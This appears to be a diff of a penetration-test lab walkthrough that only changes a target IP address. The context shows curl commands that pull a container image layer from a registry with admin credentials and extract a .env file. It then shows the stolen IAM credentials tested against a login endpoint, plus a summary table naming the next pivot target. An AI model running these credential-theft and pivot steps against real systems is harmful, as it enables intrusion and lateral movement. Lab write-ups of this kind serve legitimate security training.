@@ -82,7 +82,7 @@ Output:
 ```
 === Image ENV Variables ===
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
-CLOUD_IAM_URL=http://11.0.2.50:8080
+CLOUD_IAM_URL=http://193.0.2.136:8080
 CLOUD_IAM_USER=cloud-iam-svc
 CLOUD_IAM_PASS=IAm@CLD!2025
 APP_ENV=production
@@ -110,7 +110,7 @@ curl -s -u "registry-admin:Reg!stry@CLD2024" \
 curl -s -u "registry-admin:Reg!stry@CLD2024" \
     http://193.0.0.50/v2/pul-cloud/platform-svc/blobs/${LAYER_DIGEST} \
     | tar -Oz opt/app/config/.env
-# CLOUD_IAM_URL=http://11.0.2.50:8080
+# CLOUD_IAM_URL=http://193.0.2.136:8080
 # CLOUD_IAM_USER=cloud-iam-svc
 # CLOUD_IAM_PASS=IAm@CLD!2025
 ```
@@ -118,7 +118,7 @@ curl -s -u "registry-admin:Reg!stry@CLD2024" \
 ## Step 6 — Verify Credentials Against M5
 
 ```bash
-curl -s -X POST http://11.0.2.50:8080/api/v1/login \
+curl -s -X POST http://193.0.2.136:8080/api/v1/login \
     -H "Content-Type: application/json" \
     -d '{"username":"cloud-iam-svc","password":"IAm@CLD!2025"}' \
     | python3 -m json.tool
@@ -134,5 +134,5 @@ Pivot to M5 confirmed.
 | Vulnerability | Credentials baked into container image ENV + layer filesystem |
 | Stolen Credentials | CLOUD_IAM_USER=cloud-iam-svc / CLOUD_IAM_PASS=IAm@CLD!2025 |
 | Method | Registry v2 API — manifest → config blob → ENV inspection |
-| Next Target | M5 PUL Cloud IAM Console (11.0.2.50:8080) |
+| Next Target | M5 PUL Cloud IAM Console (193.0.2.136:8080) |
 | MITRE | T1552.001 |
